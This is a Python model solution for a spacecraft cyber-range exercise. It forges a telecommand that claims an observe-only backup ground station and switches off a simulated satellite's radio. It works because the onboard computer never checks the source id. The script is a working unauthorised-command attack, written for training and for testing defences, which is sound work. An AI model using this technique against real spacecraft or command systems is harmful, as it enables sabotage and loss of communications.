"""EX-G02 model solution: switch off a spacecraft's radio from a console that may only watch.

There is no exploit here. Nothing is overflowed, forged, replayed or malformed. The telecommand
this script sends is exactly the one the primary ground station sends when it legitimately powers
the COMM rail - the same service, the same function, the same argument, the same encoding. One
field differs: the source id in the PUS secondary header says `backup`.

The range's own authorisation matrix (src/cuberange/gs/authority.py) says the backup station may
ping and observe, and may not power. The spacecraft has never read that matrix, and until
CUBERANGE_OBC_REQUIRE_AUTHORITY it did not read the source id either - it logged it, echoed it
into the report, and dispatched the function regardless.

The consequence is worth stating plainly, because "unauthorised command executed" understates it:
function 1 switches the COMM rail. A station with observe-only authority takes the spacecraft off
the air, and the next command - including the one that would turn the radio back on - has no path
to arrive.

    python3 exercises/EX-G02-unauthorized-authority/solve.py [--station backup] [--on]
"""
import argparse
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange.gs.authority import may, station_id                # noqa: E402
from cuberange.gs.link import SpaceLink                           # noqa: E402
from cuberange.identity import spacecraft                         # noqa: E402
from cuberange.ports import link as link_port                     # noqa: E402
from cuberange.proto.frame import encode_tc_frame                 # noqa: E402
from cuberange.proto.pus import PusTc                             # noqa: E402
from cuberange.proto.spacepacket import PacketType, SpacePacket   # noqa: E402

#: PUS 8,1 - perform a function. Function 1 is "set the COMM rail".
SERVICE_FUNCTION, SUBTYPE_PERFORM = 8, 1
FUNC_SET_COMM_RAIL = 1


def build_command(station: str, state: int, seq: int = 0, satellite: int = 0) -> bytes:
    """The telecommand, byte for byte what an authorised station would send."""
    sat = spacecraft(satellite)
    app_data = FUNC_SET_COMM_RAIL.to_bytes(2, "big") + bytes([state])
    tc = PusTc(service=SERVICE_FUNCTION, subtype=SUBTYPE_PERFORM,
               source_id=station_id(station), app_data=app_data)
    packet = SpacePacket(apid=sat.apid, ptype=PacketType.TC, sec_hdr=True,
                         seq_count=seq, data=tc.encode())
    return encode_tc_frame(packet.encode(), seq=seq & 0xFF, scid=sat.scid)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--station", default="backup",
                    help="which ground station to send as (default: backup, the one that may not)")
    ap.add_argument("--on", action="store_true", help="turn the rail on instead of off")
    ap.add_argument("--satellite", type=int, default=0)
    ap.add_argument("--port", type=int, default=None, help="space link port")
    ap.add_argument("--seq", type=int, default=0)
    args = ap.parse_args()

    port = args.port if args.port is not None else link_port(args.satellite)
    state = 1 if args.on else 0
    action = "power"

    permitted = may(args.station, args.satellite, action)
    print(f"ground segment's own matrix: {args.station} may {action} satellite "
          f"{args.satellite}? {permitted}")
    if not permitted:
        print("  sending it anyway. The matrix governs this console, and this is not that console.")

    frame = build_command(args.station, state, seq=args.seq, satellite=args.satellite)
    print(f"source id 0x{station_id(args.station):04X}, function {FUNC_SET_COMM_RAIL}, "
          f"state {'ON' if state else 'OFF'}")
    print(f"frame: {frame.hex().upper()}")

    link = SpaceLink(port=port)
    link.connect(retries=60)
    try:
        link.send(frame)
        time.sleep(1.0)
    finally:
        link.close()
    print("sent. Watch the COMM rail; nothing acknowledges an unauthorised command because "
          "nothing noticed it was one.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
